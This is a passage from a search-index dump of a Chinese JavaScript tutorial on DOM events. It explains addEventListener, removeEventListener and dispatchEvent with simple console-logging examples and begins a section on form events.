\u65b9\u6cd5\u53ef\u4ee5\u4e3a\u9488\u5bf9\u5f53\u524d\u5bf9\u8c61\u7684\u540c\u4e00\u4e2a\u4e8b\u4ef6\uff0c\u6dfb\u52a0\u591a\u4e2a\u4e0d\u540c\u7684\u76d1\u542c\u51fd\u6570\u3002\u8fd9\u4e9b\u51fd\u6570\u6309\u7167\u6dfb\u52a0\u987a\u5e8f\u89e6\u53d1\uff0c\u5373\u5148\u6dfb\u52a0\u5148\u89e6\u53d1\u3002\u5982\u679c\u4e3a\u540c\u4e00\u4e2a\u4e8b\u4ef6\u591a\u6b21\u6dfb\u52a0\u540c\u4e00\u4e2a\u76d1\u542c\u51fd\u6570\uff0c\u8be5\u51fd\u6570\u53ea\u4f1a\u6267\u884c\u4e00\u6b21\uff0c\u591a\u4f59\u7684\u6dfb\u52a0\u5c06\u81ea\u52a8\u88ab\u53bb\u9664\uff08\u4e0d\u5fc5\u4f7f\u7528 removeEventListener() \u65b9\u6cd5\u624b\u52a8\u53bb\u9664\uff09\u3002 1 2 3 4 5 6 function hello () { console . log ( 'Hello world' ); } document . addEventListener ( 'click' , hello , false ); document . addEventListener ( 'click' , hello , false ); \u6267\u884c\u4e0a\u9762\u4ee3\u7801\uff0c\u70b9\u51fb\u6587\u6863\u53ea\u4f1a\u8f93\u51fa\u4e00\u884c Hello world \u3002 \u5982\u679c\u5e0c\u671b\u5411\u76d1\u542c\u51fd\u6570\u4f20\u9012\u53c2\u6570\uff0c\u53ef\u4ee5\u7528\u533f\u540d\u51fd\u6570\u5305\u88c5\u4e00\u4e0b\u76d1\u542c\u51fd\u6570\u3002 1 2 3 4 5 6 function print ( x ) { console . log ( x ); } var el = document . getElementById ( 'div1' ); el . addEventListener ( 'click' , function () { print ( 'Hello' ); }, false ); \u4e0a\u9762\u4ee3\u7801\u901a\u8fc7\u533f\u540d\u51fd\u6570\uff0c\u5411\u76d1\u542c\u51fd\u6570 print \u4f20\u9012\u4e86\u4e00\u4e2a\u53c2\u6570\u3002 \u76d1\u542c\u51fd\u6570\u5185\u90e8\u7684 this \uff0c\u6307\u5411\u5f53\u524d\u4e8b\u4ef6\u6240\u5728\u7684\u90a3\u4e2a\u5bf9\u8c61\u3002 1 2 3 4 5 6 // HTML \u4ee3\u7801\u5982\u4e0b // <p id=\"para\">Hello</p> var para = document . getElementById ( 'para' ); para . addEventListener ( 'click' , function ( e ) { console . log ( this . nodeName ); // \"P\" }, false ); \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u76d1\u542c\u51fd\u6570\u5185\u90e8\u7684 this \u6307\u5411\u4e8b\u4ef6\u6240\u5728\u7684\u5bf9\u8c61 para \u3002 EventTarget.removeEventListener() \u00b6 EventTarget.removeEventListener() \u65b9\u6cd5\u7528\u6765\u79fb\u9664 addEventListener() \u65b9\u6cd5\u6dfb\u52a0\u7684\u4e8b\u4ef6\u76d1\u542c\u51fd\u6570\u3002\u8be5\u65b9\u6cd5\u6ca1\u6709\u8fd4\u56de\u503c\u3002 1 2 div . addEventListener ( 'click' , listener , false ); div . removeEventListener ( 'click' , listener , false ); removeEventListener() \u65b9\u6cd5\u7684\u53c2\u6570\uff0c\u4e0e addEventListener() \u65b9\u6cd5\u5b8c\u5168\u4e00\u81f4\u3002\u5b83\u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\u201c\u4e8b\u4ef6\u7c7b\u578b\u201d\uff0c\u5927\u5c0f\u5199\u654f\u611f\u3002 \u6ce8\u610f\uff0c removeEventListener() \u65b9\u6cd5\u79fb\u9664\u7684\u76d1\u542c\u51fd\u6570\uff0c\u5fc5\u987b\u662f addEventListener() \u65b9\u6cd5\u6dfb\u52a0\u7684\u90a3\u4e2a\u76d1\u542c\u51fd\u6570\uff0c\u800c\u4e14\u5fc5\u987b\u5728\u540c\u4e00\u4e2a\u5143\u7d20\u8282\u70b9\uff0c\u5426\u5219\u65e0\u6548\u3002 1 2 div . addEventListener ( 'click' , function ( e ) {}, false ); div . removeEventListener ( 'click' , function ( e ) {}, false ); \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c removeEventListener() \u65b9\u6cd5\u65e0\u6548\uff0c\u56e0\u4e3a\u76d1\u542c\u51fd\u6570\u4e0d\u662f\u540c\u4e00\u4e2a\u533f\u540d\u51fd\u6570\u3002 1 2 element . addEventListener ( 'mousedown' , handleMouseDown , true ); element . removeEventListener ( \"mousedown\" , handleMouseDown , false ); \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c removeEventListener() \u65b9\u6cd5\u4e5f\u662f\u65e0\u6548\u7684\uff0c\u56e0\u4e3a\u7b2c\u4e09\u4e2a\u53c2\u6570\u4e0d\u4e00\u6837\u3002 EventTarget.dispatchEvent() \u00b6 EventTarget.dispatchEvent() \u65b9\u6cd5\u5728\u5f53\u524d\u8282\u70b9\u4e0a\u89e6\u53d1\u6307\u5b9a\u4e8b\u4ef6\uff0c\u4ece\u800c\u89e6\u53d1\u76d1\u542c\u51fd\u6570\u7684\u6267\u884c\u3002\u8be5\u65b9\u6cd5\u8fd4\u56de\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u53ea\u8981\u6709\u4e00\u4e2a\u76d1\u542c\u51fd\u6570\u8c03\u7528\u4e86 Event.preventDefault() \uff0c\u5219\u8fd4\u56de\u503c\u4e3a false \uff0c\u5426\u5219\u4e3a true \u3002 1 target . dispatchEvent ( event ) dispatchEvent() \u65b9\u6cd5\u7684\u53c2\u6570\u662f\u4e00\u4e2a Event \u5bf9\u8c61\u7684\u5b9e\u4f8b\uff08\u8be6\u89c1\u300aEvent \u5bf9\u8c61\u300b\u7ae0\u8282\uff09\u3002 1 2 3 para . addEventListener ( 'click' , hello , false ); var event = new Event ( 'click' ); para . dispatchEvent ( event ); \u4e0a\u9762\u4ee3\u7801\u5728\u5f53\u524d\u8282\u70b9\u89e6\u53d1\u4e86 click \u4e8b\u4ef6\u3002 \u5982\u679c dispatchEvent() \u65b9\u6cd5\u7684\u53c2\u6570\u4e3a\u7a7a\uff0c\u6216\u8005\u4e0d\u662f\u4e00\u4e2a\u6709\u6548\u7684\u4e8b\u4ef6\u5bf9\u8c61\uff0c\u5c06\u62a5\u9519\u3002 \u4e0b\u9762\u4ee3\u7801\u6839\u636e dispatchEvent() \u65b9\u6cd5\u7684\u8fd4\u56de\u503c\uff0c\u5224\u65ad\u4e8b\u4ef6\u662f\u5426\u88ab\u53d6\u6d88\u4e86\u3002 1 2 3 4 5 6 var canceled = ! cb . dispatchEvent ( event ); if ( canceled ) { console . log ( '\u4e8b\u4ef6\u53d6\u6d88' ); } else { console . log ( '\u4e8b\u4ef6\u672a\u53d6\u6d88' ); }","title":"EventTarget \u63a5\u53e3"},{"location":"events/eventtarget/#eventtarget","text":"\u4e8b\u4ef6\u7684\u672c\u8d28\u662f\u7a0b\u5e8f\u5404\u4e2a\u7ec4\u6210\u90e8\u5206\u4e4b\u95f4\u7684\u4e00\u79cd\u901a\u4fe1\u65b9\u5f0f\uff0c\u4e5f\u662f\u5f02\u6b65\u7f16\u7a0b\u7684\u4e00\u79cd\u5b9e\u73b0\u3002DOM \u652f\u6301\u5927\u91cf\u7684\u4e8b\u4ef6\uff0c\u672c\u7ae0\u5f00\u59cb\u4ecb\u7ecd DOM \u7684\u4e8b\u4ef6\u7f16\u7a0b\u3002 \u4ecb\u7ecd\u5177\u4f53\u7684\u4e8b\u4ef6\u4e4b\u524d\uff0c\u5148\u6765\u770b\u770b\u5982\u4f55\u8ba9 DOM \u8282\u70b9\u76d1\u542c\u4e8b\u4ef6\u3002","title":"EventTarget \u63a5\u53e3"},{"location":"events/eventtarget/#_1","text":"DOM \u8282\u70b9\u7684\u4e8b\u4ef6\u64cd\u4f5c\uff08\u76d1\u542c\u548c\u89e6\u53d1\uff09\uff0c\u90fd\u5b9a\u4e49\u5728 EventTarget \u63a5\u53e3\u3002\u6240\u6709\u8282\u70b9\u5bf9\u8c61\u90fd\u90e8\u7f72\u4e86\u8fd9\u4e2a\u63a5\u53e3\uff0c\u5176\u4ed6\u4e00\u4e9b\u9700\u8981\u4e8b\u4ef6\u901a\u4fe1\u7684\u6d4f\u89c8\u5668\u5185\u7f6e\u5bf9\u8c61\uff08\u6bd4\u5982\uff0c XMLHttpRequest \u3001 AudioNode \u3001 AudioContext \uff09\u4e5f\u90e8\u7f72\u4e86\u8fd9\u4e2a\u63a5\u53e3\u3002 \u8be5\u63a5\u53e3\u4e3b\u8981\u63d0\u4f9b\u4e09\u4e2a\u5b9e\u4f8b\u65b9\u6cd5\u3002 addEventListener() \uff1a\u7ed1\u5b9a\u4e8b\u4ef6\u7684\u76d1\u542c\u51fd\u6570 removeEventListener() \uff1a\u79fb\u9664\u4e8b\u4ef6\u7684\u76d1\u542c\u51fd\u6570 dispatchEvent() \uff1a\u89e6\u53d1\u4e8b\u4ef6","title":"\u6982\u8ff0"},{"location":"events/eventtarget/#eventtargetaddeventlistener","text":"EventTarget.addEventListener() \u7528\u4e8e\u5728\u5f53\u524d\u8282\u70b9\u6216\u5bf9\u8c61\u4e0a\uff08\u5373\u90e8\u7f72\u4e86 EventTarget \u63a5\u53e3\u7684\u5bf9\u8c61\uff09\uff0c\u5b9a\u4e49\u4e00\u4e2a\u7279\u5b9a\u4e8b\u4ef6\u7684\u76d1\u542c\u51fd\u6570\u3002\u4e00\u65e6\u8fd9\u4e2a\u4e8b\u4ef6\u53d1\u751f\uff0c\u5c31\u4f1a\u6267\u884c\u76d1\u542c\u51fd\u6570\u3002\u8be5\u65b9\u6cd5\u6ca1\u6709\u8fd4\u56de\u503c\u3002 1 target . addEventListener ( type , listener [, useCapture ]); \u8be5\u65b9\u6cd5\u63a5\u53d7\u4e09\u4e2a\u53c2\u6570\u3002 type \uff1a\u4e8b\u4ef6\u540d\u79f0\uff0c\u5927\u5c0f\u5199\u654f\u611f\u3002 listener \uff1a\u76d1\u542c\u51fd\u6570\u3002\u4e8b\u4ef6\u53d1\u751f\u65f6\uff0c\u4f1a\u8c03\u7528\u8be5\u76d1\u542c\u51fd\u6570\u3002 useCapture \uff1a\u5e03\u5c14\u503c\uff0c\u5982\u679c\u8bbe\u4e3a true \uff0c\u8868\u793a\u76d1\u542c\u51fd\u6570\u5c06\u5728\u6355\u83b7\u9636\u6bb5\uff08capture\uff09\u89e6\u53d1\uff08\u53c2\u89c1\u540e\u6587\u300a\u4e8b\u4ef6\u7684\u4f20\u64ad\u300b\u90e8\u5206\uff09\u3002\u8be5\u53c2\u6570\u53ef\u9009\uff0c\u9ed8\u8ba4\u503c\u4e3a false \uff08\u76d1\u542c\u51fd\u6570\u53ea\u5728\u5192\u6ce1\u9636\u6bb5\u88ab\u89e6\u53d1\uff09\u3002 \u4e0b\u9762\u662f\u4e00\u4e2a\u4f8b\u5b50\u3002 1 2 3 4 5 6 function hello () { console . log ( 'Hello world' ); } var button = document . getElementById ( 'btn' ); button . addEventListener ( 'click' , hello , false ); \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c button \u8282\u70b9\u7684 addEventListener() \u65b9\u6cd5\u7ed1\u5b9a click \u4e8b\u4ef6\u7684\u76d1\u542c\u51fd\u6570 hello() \uff0c\u8be5\u51fd\u6570\u53ea\u5728\u5192\u6ce1\u9636\u6bb5\u89e6\u53d1\u3002 \u5173\u4e8e\u53c2\u6570\uff0c\u6709\u4e24\u4e2a\u5730\u65b9\u9700\u8981\u6ce8\u610f\u3002 \u9996\u5148\uff0c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u9664\u4e86\u76d1\u542c\u51fd\u6570\uff0c\u8fd8\u53ef\u4ee5\u662f\u4e00\u4e2a\u5177\u6709 handleEvent \u65b9\u6cd5\u7684\u5bf9\u8c61\uff0c\u6548\u679c\u4e0e\u76d1\u542c\u51fd\u6570\u4e00\u6837\u3002 1 2 3 4 5 buttonElement . addEventListener ( 'click' , { handleEvent : function ( event ) { console . log ( 'click' ); } }); \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c addEventListener() \u65b9\u6cd5\u7684\u7b2c\u4e8c\u4e2a\u53c2\u6570\uff0c\u5c31\u662f\u4e00\u4e2a\u5177\u6709 handleEvent() \u65b9\u6cd5\u7684\u5bf9\u8c61\u3002 \u5176\u6b21\uff0c\u7b2c\u4e09\u4e2a\u53c2\u6570\u9664\u4e86\u5e03\u5c14\u503c useCapture \uff0c\u8fd8\u53ef\u4ee5\u662f\u4e00\u4e2a\u76d1\u542c\u5668\u914d\u7f6e\u5bf9\u8c61\uff0c\u5b9a\u5236\u4e8b\u4ef6\u76d1\u542c\u884c\u4e3a\u3002\u8be5\u5bf9\u8c61\u6709\u4ee5\u4e0b\u5c5e\u6027\u3002 capture \uff1a\u5e03\u5c14\u503c\uff0c\u5982\u679c\u8bbe\u4e3a true \uff0c\u8868\u793a\u76d1\u542c\u51fd\u6570\u5728\u6355\u83b7\u9636\u6bb5\u89e6\u53d1\uff0c\u9ed8\u8ba4\u4e3a false \uff0c\u5728\u5192\u6ce1\u9636\u6bb5\u89e6\u53d1\u3002 once \uff1a\u5e03\u5c14\u503c\uff0c\u5982\u679c\u8bbe\u4e3a true \uff0c\u8868\u793a\u76d1\u542c\u51fd\u6570\u6267\u884c\u4e00\u6b21\u5c31\u4f1a\u81ea\u52a8\u79fb\u9664\uff0c\u540e\u9762\u5c06\u4e0d\u518d\u76d1\u542c\u8be5\u4e8b\u4ef6\u3002\u8be5\u5c5e\u6027\u9ed8\u8ba4\u503c\u4e3a false \u3002 passive \uff1a\u5e03\u5c14\u503c\uff0c\u8bbe\u4e3a true \u65f6\uff0c\u8868\u793a\u7981\u6b62\u76d1\u542c\u51fd\u6570\u8c03\u7528 preventDefault() \u65b9\u6cd5\u3002\u5982\u679c\u8c03\u7528\u4e86\uff0c\u6d4f\u89c8\u5668\u5c06\u5ffd\u7565\u8fd9\u4e2a\u8981\u6c42\uff0c\u5e76\u5728\u63a7\u5236\u53f0\u8f93\u51fa\u4e00\u6761\u8b66\u544a\u3002\u8be5\u5c5e\u6027\u9ed8\u8ba4\u503c\u4e3a false \u3002 signal \uff1a\u8be5\u5c5e\u6027\u7684\u503c\u4e3a\u4e00\u4e2a AbortSignal \u5bf9\u8c61\uff0c\u4e3a\u76d1\u542c\u5668\u8bbe\u7f6e\u4e86\u4e00\u4e2a\u4fe1\u53f7\u901a\u9053\uff0c\u7528\u6765\u5728\u9700\u8981\u65f6\u53d1\u51fa\u4fe1\u53f7\uff0c\u79fb\u9664\u76d1\u542c\u51fd\u6570\u3002 \u4e0b\u9762\u662f once \u5c5e\u6027\u7684\u4f8b\u5b50\uff0c\u8ba9\u76d1\u542c\u51fd\u6570\u53ea\u6267\u884c\u4e00\u6b21\u3002 1 2 3 element . addEventListener ( 'click' , function ( event ) { // \u53ea\u6267\u884c\u4e00\u6b21\u7684\u4ee3\u7801 }, { once : true }); addEventListener() \u65b9\u6cd5\u53ef\u4ee5\u4e3a\u9488\u5bf9\u5f53\u524d\u5bf9\u8c61\u7684\u540c\u4e00\u4e2a\u4e8b\u4ef6\uff0c\u6dfb\u52a0\u591a\u4e2a\u4e0d\u540c\u7684\u76d1\u542c\u51fd\u6570\u3002\u8fd9\u4e9b\u51fd\u6570\u6309\u7167\u6dfb\u52a0\u987a\u5e8f\u89e6\u53d1\uff0c\u5373\u5148\u6dfb\u52a0\u5148\u89e6\u53d1\u3002\u5982\u679c\u4e3a\u540c\u4e00\u4e2a\u4e8b\u4ef6\u591a\u6b21\u6dfb\u52a0\u540c\u4e00\u4e2a\u76d1\u542c\u51fd\u6570\uff0c\u8be5\u51fd\u6570\u53ea\u4f1a\u6267\u884c\u4e00\u6b21\uff0c\u591a\u4f59\u7684\u6dfb\u52a0\u5c06\u81ea\u52a8\u88ab\u53bb\u9664\uff08\u4e0d\u5fc5\u4f7f\u7528 removeEventListener() \u65b9\u6cd5\u624b\u52a8\u53bb\u9664\uff09\u3002 1 2 3 4 5 6 function hello () { console . log ( 'Hello world' ); } document . addEventListener ( 'click' , hello , false ); document . addEventListener ( 'click' , hello , false ); \u6267\u884c\u4e0a\u9762\u4ee3\u7801\uff0c\u70b9\u51fb\u6587\u6863\u53ea\u4f1a\u8f93\u51fa\u4e00\u884c Hello world \u3002 \u5982\u679c\u5e0c\u671b\u5411\u76d1\u542c\u51fd\u6570\u4f20\u9012\u53c2\u6570\uff0c\u53ef\u4ee5\u7528\u533f\u540d\u51fd\u6570\u5305\u88c5\u4e00\u4e0b\u76d1\u542c\u51fd\u6570\u3002 1 2 3 4 5 6 function print ( x ) { console . log ( x ); } var el = document . getElementById ( 'div1' ); el . addEventListener ( 'click' , function () { print ( 'Hello' ); }, false ); \u4e0a\u9762\u4ee3\u7801\u901a\u8fc7\u533f\u540d\u51fd\u6570\uff0c\u5411\u76d1\u542c\u51fd\u6570 print \u4f20\u9012\u4e86\u4e00\u4e2a\u53c2\u6570\u3002 \u76d1\u542c\u51fd\u6570\u5185\u90e8\u7684 this \uff0c\u6307\u5411\u5f53\u524d\u4e8b\u4ef6\u6240\u5728\u7684\u90a3\u4e2a\u5bf9\u8c61\u3002 1 2 3 4 5 6 // HTML \u4ee3\u7801\u5982\u4e0b // <p id=\"para\">Hello</p> var para = document . getElementById ( 'para' ); para . addEventListener ( 'click' , function ( e ) { console . log ( this . nodeName ); // \"P\" }, false ); \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u76d1\u542c\u51fd\u6570\u5185\u90e8\u7684 this \u6307\u5411\u4e8b\u4ef6\u6240\u5728\u7684\u5bf9\u8c61 para \u3002","title":"EventTarget.addEventListener()"},{"location":"events/eventtarget/#eventtargetremoveeventlistener","text":"EventTarget.removeEventListener() \u65b9\u6cd5\u7528\u6765\u79fb\u9664 addEventListener() \u65b9\u6cd5\u6dfb\u52a0\u7684\u4e8b\u4ef6\u76d1\u542c\u51fd\u6570\u3002\u8be5\u65b9\u6cd5\u6ca1\u6709\u8fd4\u56de\u503c\u3002 1 2 div . addEventListener ( 'click' , listener , false ); div . removeEventListener ( 'click' , listener , false ); removeEventListener() \u65b9\u6cd5\u7684\u53c2\u6570\uff0c\u4e0e addEventListener() \u65b9\u6cd5\u5b8c\u5168\u4e00\u81f4\u3002\u5b83\u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\u201c\u4e8b\u4ef6\u7c7b\u578b\u201d\uff0c\u5927\u5c0f\u5199\u654f\u611f\u3002 \u6ce8\u610f\uff0c removeEventListener() \u65b9\u6cd5\u79fb\u9664\u7684\u76d1\u542c\u51fd\u6570\uff0c\u5fc5\u987b\u662f addEventListener() \u65b9\u6cd5\u6dfb\u52a0\u7684\u90a3\u4e2a\u76d1\u542c\u51fd\u6570\uff0c\u800c\u4e14\u5fc5\u987b\u5728\u540c\u4e00\u4e2a\u5143\u7d20\u8282\u70b9\uff0c\u5426\u5219\u65e0\u6548\u3002 1 2 div . addEventListener ( 'click' , function ( e ) {}, false ); div . removeEventListener ( 'click' , function ( e ) {}, false ); \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c removeEventListener() \u65b9\u6cd5\u65e0\u6548\uff0c\u56e0\u4e3a\u76d1\u542c\u51fd\u6570\u4e0d\u662f\u540c\u4e00\u4e2a\u533f\u540d\u51fd\u6570\u3002 1 2 element . addEventListener ( 'mousedown' , handleMouseDown , true ); element . removeEventListener ( \"mousedown\" , handleMouseDown , false ); \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c removeEventListener() \u65b9\u6cd5\u4e5f\u662f\u65e0\u6548\u7684\uff0c\u56e0\u4e3a\u7b2c\u4e09\u4e2a\u53c2\u6570\u4e0d\u4e00\u6837\u3002","title":"EventTarget.removeEventListener()"},{"location":"events/eventtarget/#eventtargetdispatchevent","text":"EventTarget.dispatchEvent() \u65b9\u6cd5\u5728\u5f53\u524d\u8282\u70b9\u4e0a\u89e6\u53d1\u6307\u5b9a\u4e8b\u4ef6\uff0c\u4ece\u800c\u89e6\u53d1\u76d1\u542c\u51fd\u6570\u7684\u6267\u884c\u3002\u8be5\u65b9\u6cd5\u8fd4\u56de\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u53ea\u8981\u6709\u4e00\u4e2a\u76d1\u542c\u51fd\u6570\u8c03\u7528\u4e86 Event.preventDefault() \uff0c\u5219\u8fd4\u56de\u503c\u4e3a false \uff0c\u5426\u5219\u4e3a true \u3002 1 target . dispatchEvent ( event ) dispatchEvent() \u65b9\u6cd5\u7684\u53c2\u6570\u662f\u4e00\u4e2a Event \u5bf9\u8c61\u7684\u5b9e\u4f8b\uff08\u8be6\u89c1\u300aEvent \u5bf9\u8c61\u300b\u7ae0\u8282\uff09\u3002 1 2 3 para . addEventListener ( 'click' , hello , false ); var event = new Event ( 'click' ); para . dispatchEvent ( event ); \u4e0a\u9762\u4ee3\u7801\u5728\u5f53\u524d\u8282\u70b9\u89e6\u53d1\u4e86 click \u4e8b\u4ef6\u3002 \u5982\u679c dispatchEvent() \u65b9\u6cd5\u7684\u53c2\u6570\u4e3a\u7a7a\uff0c\u6216\u8005\u4e0d\u662f\u4e00\u4e2a\u6709\u6548\u7684\u4e8b\u4ef6\u5bf9\u8c61\uff0c\u5c06\u62a5\u9519\u3002 \u4e0b\u9762\u4ee3\u7801\u6839\u636e dispatchEvent() \u65b9\u6cd5\u7684\u8fd4\u56de\u503c\uff0c\u5224\u65ad\u4e8b\u4ef6\u662f\u5426\u88ab\u53d6\u6d88\u4e86\u3002 1 2 3 4 5 6 var canceled = ! cb . dispatchEvent ( event ); if ( canceled ) { console . log ( '\u4e8b\u4ef6\u53d6\u6d88' ); } else { console . log ( '\u4e8b\u4ef6\u672a\u53d6\u6d88' ); }","title":"EventTarget.dispatchEvent()"},{"location":"events/form/","text":"\u8868\u5355\u4e8b\u4ef6 \u00b6 \u8868\u5355\u4e8b\u4ef6\u7684\u79cd\u7c7b \u00b6 input \u4e8b\u4ef6 \u00b6 input \u4e8b\u4ef6\u5f53 <input> \u3001 <select> \u3001 <textarea> \u7684\u503c\u53d1\u751f\u53d8\u5316\u65f6\u89e6\u53d1\u3002\u5bf9\u4e8e\u590d\u9009\u6846\uff08 <input type=checkbox> \uff09\u6216\u5355\u9009\u6846\uff08 <input type=radio> \uff09\uff0c\u7528\u6237\u6539\u53d8\u9009\u9879\u65f6\uff0c\u4e5f\u4f1a\u89e6\u53d1\u8fd9\u4e2a\u4e8b\u4ef6\u3002\u53e6\u5916\uff0c\u5bf9\u4e8e\u6253\u5f00 contenteditable \u5c5e\u6027\u7684\u5143\u7d20\uff0c\u53ea\u8981\u503c\u53d1\u751f\u53d8\u5316\uff0c\u4e5f\u4f1a\u89e6\u53d1 input \u4e8b\u4ef6\u3002 input \u4e8b\u4ef6\u7684\u4e00\u4e2a\u7279\u70b9\uff0c\u5c31\u662f\u4f1a\u8fde\u7eed\u89e6\u53d1\uff0c\u6bd4\u5982\u7528\u6237\u6bcf\u6309\u4e0b\u4e00\u6b21\u6309\u952e\uff0c\u5c31\u4f1a\u89e6\u53d1\u4e00\u6b21 input \u4e8b\u4ef6\u3002 input \u4e8b\u4ef6\u5bf9\u8c61\u7ee7\u627f\u4e86 InputEvent \u63a5\u53e3\u3002 \u8be5\u4e8b\u4ef6\u8ddf change \u4e8b\u4ef6\u5f88\u50cf\uff0c\u4e0d\u540c\u4e4b\u5904\u5728\u4e8e input \u4e8b\u4ef6\u5728\u5143\u7d20\u7684\u503c\u53d1\u751f\u53d8\u5316\u540e\u7acb\u5373\u53d1\u751f\uff0c\u800c change \u5728\u5143\u7d20\u5931\u53bb\u7126\u70b9\u65f6\u53d1\u751f\uff0c\u800c\u5185\u5bb9\u6b64\u65f6\u53ef\u80fd\u5df2\u7ecf\u53d8\u5316\u591a\u6b21\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u5982\u679c\u6709\u8fde\u7eed\u53d8\u5316\uff0c input \u4e8b\u4ef6\u4f1a\u89e6\u53d1\u591a\u6b21\uff0c\u800c change \u4e8b\u4ef6\u53ea\u5728\u5931\u53bb\u7126\u70b9\u65f6\u89e6\u53d1\u4e00\u6b21\u3002 \u4e0b\u9762\u662f <select> \u5143\u7d20\u7684\u4f8b\u5b50\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 /* HTML \u4ee3\u7801\u5982\u4e0b <select id=\"mySelect\"> <option value=\"1\">1</option> <option value=\"2\">2</option> <option value=\"3\">3</option> </select> */ function inputHandler ( e ) { console . log ( e . target . value ) } var mySelect = document . querySelector ( '#mySelect' ); mySelect . addEventListener ( 'input' , inputHandler ); \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u6539\u53d8\u4e0b\u62c9\u6846\u9009\u9879\u65f6\uff0c\u4f1a\u89e6\u53d1 input \u4e8b\u4ef6\uff0c\u4ece\u800c\u6267\u884c\u56de\u8c03\u51fd\u6570 inputHandler \u3002 select \u4e8b\u4ef6 \u00b6 select \u4e8b\u4ef6\u5f53\u5728 <input> \u3001 <textarea> \u91cc\u9762\u9009\u4e2d\u6587\u672c\u65f6\u89e6\u53d1\u3002 1 2 3 4 5 6 7 // HTML \u4ee3\u7801\u5982\u4e0b // <input id=\"test\" type=\"text\" value=\"Select me!\" /> var elem = document . getElementById ( 'test' ); elem . addEventListener ( 'select' , function ( e ) { console . log ( e . type ); // \"select\" }, false ); \u9009\u4e2d\u7684\u6587\u672c\u53ef\u4ee5\u901a\u8fc7 event.target \u5143\u7d20\u7684 selectionDirection \u3001 selectionEnd \u3001 selectionStart \u548c value \u5c5e\u6027\u62ff\u5230\u3002 change \u4e8b\u4ef6 \u00b6 change \u4e8b\u4ef6\u5f53 <input> \u3001 <select> \u3001 <textarea> \u7684\u503c\u53d1\u751f\u53d8\u5316\u65f6\u89e6\u53d1\u3002\u5b83\u4e0e input \u4e8b\u4ef6\u7684\u6700\u5927\u4e0d\u540c\uff0c\u5c31\u662f\u4e0d\u4f1a\u8fde\u7eed\u89e6\u53d1\uff0c\u53ea\u6709\u5f53\u5168\u90e8\u4fee\u6539\u5b8c\u6210\u65f6\u624d\u4f1a\u89e6\u53d1\uff0c\u53e6\u4e00\u65b9\u9762 input \u4e8b\u4ef6\u5fc5\u7136\u4f34\u968f change \u4e8b\u4ef6\u3002\u5177\u4f53\u6765\u8bf4\uff0c\u5206\u6210\u4ee5\u4e0b\u51e0\u79cd\u60c5\u51b5\u3002 \u6fc0\u6d3b\u5355\u9009\u6846\uff08radio\uff09\u6216\u590d\u9009\u6846\uff08checkbox\uff09\u65f6\u89e6\u53d1\u3002 \u7528\u6237\u63d0\u4ea4\u65f6\u89e6\u53d1\u3002\u6bd4\u5982\uff0c\u4ece\u4e0b\u5217\u5217\u8868\uff08select\uff09\u5b8c\u6210\u9009\u62e9\uff0c\u5728\u65e5\u671f\u6216\u6587\u4ef6\u8f93\u5165\u6846\u5b8c\u6210\u9009\u62e9\u3002 \u5f53\u6587\u672c\u6846\u6216 <textarea> \u5143\u7d20\u7684\u503c\u53d1\u751f\u6539\u53d8\uff0c\u5e76\u4e14\u4e27\u5931\u7126\u70b9\u65f6\u89e6\u53d1\u3002 \u4e0b\u9762\u662f\u4e00\u4e2a\u4f8b\u5b50\u3002 1 2 3 4 5 6 7 8 9 10 // HTML \u4ee3\u7801\u5982\u4e0b // <select size=\"1\" onchange=\"changeEventHandler(event);\"> // <option>chocolate</option> // <option>strawberry</option> // <option>vanilla</option> // </select> function changeEventHandler ( event ) { console . log ( event . target . value ); } \u5982\u679c\u6bd4\u8f83\u4e00\u4e0b\u4e0a\u9762 input \u4e8b\u4ef6\u7684\u4f8b\u5b50\uff0c\u4f60\u4f1a\u53d1\u73b0\u5bf9\u4e8e <select> \u5143\u7d20\u6765\u8bf4\uff0c input \u548c change \u4e8b\u4ef6\u57fa\u672c\u662f\u7b49\u4ef7\u7684\u3002 invalid \u4e8b\u4ef6 \u00b6 \u7528\u6237\u63d0\u4ea4\u8868\u5355\u65f6\uff0c\u5982\u679c\u8868\u5355\u5143\u7d20\u7684\u503c\u4e0d\u6ee1\u8db3\u6821\u9a8c\u6761\u4ef6\uff0c\u5c31\u4f1a\u89e6\u53d1 invalid \u4e8b\u4ef6\u3002 1 2 3 4 < form > < input type = \"text\" required oninvalid = \"console.log('invalid input')\" /> < button type = \"submit\" > \u63d0\u4ea4 </ button > </ form > \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u8f93\u5165\u6846\u662f\u5fc5\u586b\u7684\u3002\u5982\u679c\u4e0d\u586b\uff0c\u7528\u6237\u70b9\u51fb\u6309\u94ae\u63d0\u4ea4\u65f6\uff0c\u5c31\u4f1a\u89e6\u53d1\u8f93\u5165\u6846\u7684 invalid \u4e8b\u4ef6\uff0c\u5bfc\u81f4\u63d0\u4ea4\u88ab\u53d6\u6d88\u3002 reset \u4e8b\u4ef6\uff0csubmit \u4e8b\u4ef6 \u00b6 \u8fd9\u4e24\u4e2a\u4e8b\u4ef6\u53d1\u751f\u5728\u8868\u5355\u5bf9\u8c61 <form> \u4e0a\uff0c\u800c\u4e0d\u662f\u53d1\u751f\u5728\u8868\u5355\u7684\u6210\u5458\u4e0a\u3002 reset \u4e8b\u4ef6\u5f53\u8868\u5355\u91cd\u7f6e\uff08\u6240\u6709\u8868\u5355\u6210\u5458\u53d8\u56de\u9ed8\u8ba4\u503c\uff09\u65f6\u89e6\u53d1\u3002 submit \u4e8b\u4ef6\u5f53\u8868\u5355\u6570\u636e\u5411\u670d\u52a1\u5668\u63d0\u4ea4\u65f6\u89e6\u53d1\u3002\u6ce8\u610f\uff0c submit \u4e8b\u4ef6\u7684\u53d1\u751f\u5bf9\u8c61\u662f <form> \u5143\u7d20\uff0c\u800c\u4e0d\u662f <button> 